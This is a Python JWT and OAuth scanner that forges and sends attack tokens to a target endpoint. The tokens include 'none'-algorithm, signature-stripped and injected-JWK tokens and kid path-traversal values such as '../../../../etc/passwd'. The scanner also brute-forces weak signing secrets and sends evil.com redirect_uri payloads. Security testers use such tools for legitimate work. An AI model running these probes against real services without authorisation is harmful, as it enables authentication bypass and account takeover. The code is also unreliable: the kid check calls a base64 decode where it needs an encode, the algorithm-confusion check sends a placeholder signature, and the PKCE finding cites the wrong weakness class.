"""
JWT & OAuth Vulnerability Scanner
==================================

Advanced JWT and OAuth 2.0 security testing
Detects all major JWT/OAuth attack vectors

Author: AI Pentest Brain Team
Version: 1.0
"""

import requests
import jwt
import base64
import json
import hashlib
import hmac
from typing import Dict, List, Optional
import logging
from datetime import datetime, timedelta

logger = logging.getLogger(__name__)


class JWTOAuthScanner:
    """
    JWT and OAuth 2.0 vulnerability scanner
    Covers all major JWT/OAuth attack vectors
    """
    
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
    
    def scan_jwt(self, token: str, endpoint: str = None) -> List[Dict]:
        """Scan JWT token for vulnerabilities"""
        vulnerabilities = []
        
        logger.info("Starting JWT vulnerability scan")
        
        vulnerabilities.extend(self._check_none_algorithm(token, endpoint))
        vulnerabilities.extend(self._check_algorithm_confusion(token, endpoint))
        vulnerabilities.extend(self._check_weak_secret(token))
        vulnerabilities.extend(self._check_kid_injection(token, endpoint))
        vulnerabilities.extend(self._check_jwk_injection(token, endpoint))
        vulnerabilities.extend(self._check_expiration(token))
        vulnerabilities.extend(self._check_signature_stripping(token, endpoint))
        
        return vulnerabilities
    
    def scan_oauth(self, auth_endpoint: str, token_endpoint: str, client_id: str) -> List[Dict]:
        """Scan OAuth 2.0 implementation"""
        vulnerabilities = []
        
        logger.info("Starting OAuth 2.0 vulnerability scan")
        
        vulnerabilities.extend(self._check_open_redirect(auth_endpoint))
        vulnerabilities.extend(self._check_csrf_protection(auth_endpoint))
        vulnerabilities.extend(self._check_state_parameter(auth_endpoint, client_id))
        vulnerabilities.extend(self._check_pkce(auth_endpoint))
        vulnerabilities.extend(self._check_token_leakage(auth_endpoint))
        
        return vulnerabilities
    
    def _check_none_algorithm(self, token: str, endpoint: str = None) -> List[Dict]:
        """Check for 'none' algorithm vulnerability"""
        vulnerabilities = []
        
        try:
            # Decode token without verification
            header, payload, signature = token.split('.')
            
            # Create new token with 'none' algorithm
            header_dict = json.loads(base64.urlsafe_b64decode(header + '=='))
            header_dict['alg'] = 'none'
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_dict).encode()
            ).decode().rstrip('=')
            
            # Create token without signature
            none_token = f"{new_header}.{payload}."
            
            # If endpoint provided, test it
            if endpoint:
                response = self.session.get(
                    endpoint,
                    headers={'Authorization': f'Bearer {none_token}'}
                )
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'jwt_none_algorithm',
                        'severity': 'CRITICAL',
                        'description': 'JWT accepts "none" algorithm - signature bypass',
                        'impact': 'Attacker can forge any JWT token without a signature',
                        'evidence': '"none" algorithm token accepted',
                        'recommendation': 'Reject tokens with "none" algorithm explicitly',
                        'cwe': 'CWE-347: Improper Verification of Cryptographic Signature'
                    })
        
        except Exception as e:
            logger.debug(f"None algorithm check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_algorithm_confusion(self, token: str, endpoint: str = None) -> List[Dict]:
        """Check for algorithm confusion (RS256 to HS256)"""
        vulnerabilities = []
        
        try:
            # Decode token
            header, payload, signature = token.split('.')
            header_dict = json.loads(base64.urlsafe_b64decode(header + '=='))
            
            # If token uses RS256, try to confuse with HS256
            if header_dict.get('alg') == 'RS256':
                # Change algorithm to HS256
                header_dict['alg'] = 'HS256'
                
                new_header = base64.urlsafe_b64encode(
                    json.dumps(header_dict).encode()
                ).decode().rstrip('=')
                
                # Sign with public key as secret (common vulnerability)
                # In real test, you'd need the public key
                confused_token = f"{new_header}.{payload}.fakesignature"
                
                if endpoint:
                    response = self.session.get(
                        endpoint,
                        headers={'Authorization': f'Bearer {confused_token}'}
                    )
                    
                    if response.status_code == 200:
                        vulnerabilities.append({
                            'type': 'jwt_algorithm_confusion',
                            'severity': 'CRITICAL',
                            'description': 'JWT vulnerable to algorithm confusion attack',
                            'impact': 'Attacker can sign tokens using public key as HMAC secret',
                            'evidence': 'RS256 to HS256 confusion successful',
                            'recommendation': 'Enforce specific algorithm, reject unexpected algorithms',
                            'cwe': 'CWE-327: Use of a Broken or Risky Cryptographic Algorithm'
                        })
        
        except Exception as e:
            logger.debug(f"Algorithm confusion check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_weak_secret(self, token: str) -> List[Dict]:
        """Check for weak JWT secret"""
        vulnerabilities = []
        
        weak_secrets = [
            'secret', 'password', '123456', 'qwerty', 'admin',
            'test', 'secret123', 'password123', 'jwt_secret',
            '', 'null', 'undefined'
        ]
        
        try:
            for secret in weak_secrets:
                try:
                    # Try to decode with weak secret
                    decoded = jwt.decode(token, secret, algorithms=['HS256', 'HS384', 'HS512'])
                    
                    vulnerabilities.append({
                        'type': 'jwt_weak_secret',
                        'severity': 'CRITICAL',
                        'description': f'JWT uses weak secret: {secret}',
                        'impact': 'Attacker can forge any JWT token',
                        'evidence': f'Token decoded with secret: {secret}',
                        'recommendation': 'Use strong, random secrets (min 256 bits)',
                        'cwe': 'CWE-521: Weak Password Requirements'
                    })
                    break
                
                except jwt.InvalidSignatureError:
                    continue
                except:
                    continue
        
        except Exception as e:
            logger.debug(f"Weak secret check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_kid_injection(self, token: str, endpoint: str = None) -> List[Dict]:
        """Check for KID (Key ID) injection vulnerability"""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_dict = json.loads(base64.urlsafe_b64decode(header + '=='))
            
            # Try path traversal in kid
            injection_kids = [
                '../../dev/null',
                '/dev/null',
                '../../../../etc/passwd',
                'key.txt'
            ]
            
            for kid in injection_kids:
                header_dict['kid'] = kid
                
                new_header = base64.urlsafe_b64decode(
                    json.dumps(header_dict).encode()
                ).decode().rstrip('=')
                
                # Create test token
                injected_token = f"{new_header}.{payload}.{signature}"
                
                if endpoint:
                    response = self.session.get(
                        endpoint,
                        headers={'Authorization': f'Bearer {injected_token}'}
                    )
                    
                    # Check for error messages indicating file access
                    if 'file not found' in response.text.lower() or 'no such file' in response.text.lower():
                        vulnerabilities.append({
                            'type': 'jwt_kid_injection',
                            'severity': 'HIGH',
                            'description': 'JWT KID parameter vulnerable to path traversal',
                            'impact': 'Possible arbitrary file read or key confusion',
                            'evidence': f'KID injection successful: {kid}',
                            'recommendation': 'Validate KID parameter, use whitelist of allowed key IDs',
                            'cwe': 'CWE-22: Path Traversal'
                        })
                        break
        
        except Exception as e:
            logger.debug(f"KID injection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_jwk_injection(self, token: str, endpoint: str = None) -> List[Dict]:
        """Check for JWK injection vulnerability"""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            header_dict = json.loads(base64.urlsafe_b64decode(header + '=='))
            
            # Add malicious JWK to header
            malicious_jwk = {
                "kty": "RSA",
                "kid": "attacker-key",
                "use": "sig",
                "n": "fake_modulus",
                "e": "AQAB"
            }
            
            header_dict['jwk'] = malicious_jwk
            
            new_header = base64.urlsafe_b64encode(
                json.dumps(header_dict).encode()
            ).decode().rstrip('=')
            
            # If server uses embedded JWK, it might verify with our key
            if endpoint:
                injected_token = f"{new_header}.{payload}.{signature}"
                response = self.session.get(
                    endpoint,
                    headers={'Authorization': f'Bearer {injected_token}'}
                )
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'jwt_jwk_injection',
                        'severity': 'CRITICAL',
                        'description': 'JWT accepts embedded JWK - key injection possible',
                        'impact': 'Attacker can inject their own signing key',
                        'evidence': 'Embedded JWK accepted',
                        'recommendation': 'Do not trust embedded JWK, use server-side key store',
                        'cwe': 'CWE-347: Improper Verification of Cryptographic Signature'
                    })
        
        except Exception as e:
            logger.debug(f"JWK injection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_expiration(self, token: str) -> List[Dict]:
        """Check expiration time"""
        vulnerabilities = []
        
        try:
            # Decode without verification
            payload = jwt.decode(token, options={"verify_signature": False})
            
            if 'exp' not in payload:
                vulnerabilities.append({
                    'type': 'jwt_no_expiration',
                    'severity': 'MEDIUM',
                    'description': 'JWT has no expiration time',
                    'impact': 'Token can be used indefinitely',
                    'evidence': 'No "exp" claim found',
                    'recommendation': 'Always include "exp" claim with reasonable duration',
                    'cwe': 'CWE-613: Insufficient Session Expiration'
                })
            else:
                exp_time = datetime.fromtimestamp(payload['exp'])
                iat_time = datetime.fromtimestamp(payload.get('iat', payload['exp']))
                duration = exp_time - iat_time
                
                # Check if duration is too long (>24 hours)
                if duration.total_seconds() > 86400:
                    vulnerabilities.append({
                        'type': 'jwt_long_expiration',
                        'severity': 'LOW',
                        'description': 'JWT expiration time is too long',
                        'impact': 'Increases risk window if token is compromised',
                        'evidence': f'Token valid for {duration.total_seconds()/3600:.1f} hours',
                        'recommendation': 'Use shorter expiration times (15 min to 1 hour)',
                        'cwe': 'CWE-613: Insufficient Session Expiration'
                    })
        
        except Exception as e:
            logger.debug(f"Expiration check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_signature_stripping(self, token: str, endpoint: str = None) -> List[Dict]:
        """Check if signature can be stripped"""
        vulnerabilities = []
        
        try:
            header, payload, signature = token.split('.')
            
            # Try removing signature
            unsigned_token = f"{header}.{payload}."
            
            if endpoint:
                response = self.session.get(
                    endpoint,
                    headers={'Authorization': f'Bearer {unsigned_token}'}
                )
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'jwt_signature_stripping',
                        'severity': 'CRITICAL',
                        'description': 'JWT signature can be removed',
                        'impact': 'Attacker can forge tokens by removing signature',
                        'evidence': 'Unsigned token accepted',
                        'recommendation': 'Always verify signature is present and valid',
                        'cwe': 'CWE-347: Improper Verification of Cryptographic Signature'
                    })
        
        except Exception as e:
            logger.debug(f"Signature stripping check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_open_redirect(self, auth_endpoint: str) -> List[Dict]:
        """Check for open redirect in OAuth flow"""
        vulnerabilities = []
        
        malicious_redirects = [
            'http://evil.com',
            'http://evil.com@legitimate.com',
            '//evil.com',
            'https://evil.com',
        ]
        
        for redirect in malicious_redirects:
            try:
                response = self.session.get(
                    auth_endpoint,
                    params={'redirect_uri': redirect},
                    allow_redirects=False
                )
                
                if response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('Location', '')
                    if 'evil.com' in location:
                        vulnerabilities.append({
                            'type': 'oauth_open_redirect',
                            'severity': 'HIGH',
                            'description': 'OAuth redirect_uri not validated',
                            'impact': 'Token leakage through open redirect',
                            'evidence': f'Redirected to: {redirect}',
                            'recommendation': 'Validate redirect_uri against whitelist',
                            'cwe': 'CWE-601: URL Redirection to Untrusted Site'
                        })
                        break
            
            except Exception as e:
                logger.debug(f"Open redirect check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_csrf_protection(self, auth_endpoint: str) -> List[Dict]:
        """Check for CSRF protection in OAuth flow"""
        vulnerabilities = []
        
        try:
            # Try OAuth flow without state parameter
            response = self.session.get(
                auth_endpoint,
                params={
                    'response_type': 'code',
                    'client_id': 'test'
                }
            )
            
            if response.status_code == 200 and 'state' not in response.text.lower():
                vulnerabilities.append({
                    'type': 'oauth_missing_state',
                    'severity': 'HIGH',
                    'description': 'OAuth flow missing state parameter',
                    'impact': 'Vulnerable to CSRF attacks',
                    'evidence': 'State parameter not enforced',
                    'recommendation': 'Require and validate state parameter',
                    'cwe': 'CWE-352: Cross-Site Request Forgery'
                })
        
        except Exception as e:
            logger.debug(f"CSRF protection check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_state_parameter(self, auth_endpoint: str, client_id: str) -> List[Dict]:
        """Check state parameter validation"""
        vulnerabilities = []
        
        try:
            # Try with predictable state
            predictable_states = ['123456', 'state', 'abc', '1']
            
            for state in predictable_states:
                response = self.session.get(
                    auth_endpoint,
                    params={
                        'response_type': 'code',
                        'client_id': client_id,
                        'state': state
                    }
                )
                
                if response.status_code == 200:
                    vulnerabilities.append({
                        'type': 'oauth_weak_state',
                        'severity': 'MEDIUM',
                        'description': 'OAuth accepts predictable state parameter',
                        'impact': 'Weakened CSRF protection',
                        'evidence': f'Predictable state accepted: {state}',
                        'recommendation': 'Generate cryptographically random state values',
                        'cwe': 'CWE-330: Use of Insufficiently Random Values'
                    })
                    break
        
        except Exception as e:
            logger.debug(f"State parameter check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_pkce(self, auth_endpoint: str) -> List[Dict]:
        """Check if PKCE is implemented (should be for public clients)"""
        vulnerabilities = []
        
        try:
            response = self.session.get(
                auth_endpoint,
                params={
                    'response_type': 'code',
                    'client_id': 'public_client'
                }
            )
            
            # Check if code_challenge parameter is accepted
            if 'code_challenge' not in response.text.lower():
                vulnerabilities.append({
                    'type': 'oauth_missing_pkce',
                    'severity': 'MEDIUM',
                    'description': 'OAuth flow does not support PKCE',
                    'impact': 'Public clients vulnerable to authorization code interception',
                    'evidence': 'PKCE not implemented',
                    'recommendation': 'Implement PKCE (RFC 7636) for public clients',
                    'cwe': 'CWE-494: Download of Code Without Integrity Check'
                })
        
        except Exception as e:
            logger.debug(f"PKCE check error: {str(e)}")
        
        return vulnerabilities
    
    def _check_token_leakage(self, auth_endpoint: str) -> List[Dict]:
        """Check for token leakage vectors"""
        vulnerabilities = []
        
        try:
            # Check if token is in URL (should use POST for token endpoint)
            response = self.session.get(
                auth_endpoint,
                params={
                    'response_type': 'token',  # Implicit flow
                    'client_id': 'test'
                },
                allow_redirects=False
            )
            
            if response.status_code in [301, 302]:
                location = response.headers.get('Location', '')
                if '#access_token=' in location:
                    vulnerabilities.append({
                        'type': 'oauth_token_in_url',
                        'severity': 'HIGH',
                        'description': 'OAuth token exposed in URL fragment',
                        'impact': 'Token can leak through Referer header or browser history',
                        'evidence': 'Access token in URL fragment',
                        'recommendation': 'Use authorization code flow instead of implicit flow',
                        'cwe': 'CWE-598: Information Exposure Through Query Strings'
                    })
        
        except Exception as e:
            logger.debug(f"Token leakage check error: {str(e)}")
        
        return vulnerabilities


# Test function
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    
    print("="*70)
    print("JWT & OAuth Vulnerability Scanner - Test")
    print("="*70 + "\n")
    
    # Example JWT scan
    example_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    
    scanner = JWTOAuthScanner("http://localhost:3000")
    vulnerabilities = scanner.scan_jwt(example_token)
    
    print(f"\n[+] Found {len(vulnerabilities)} JWT vulnerabilities\n")
    
    for vuln in vulnerabilities:
        print(f"Type: {vuln['type']}")
        print(f"Severity: {vuln['severity']}")
        print(f"Description: {vuln['description']}")
        print("-" * 70)
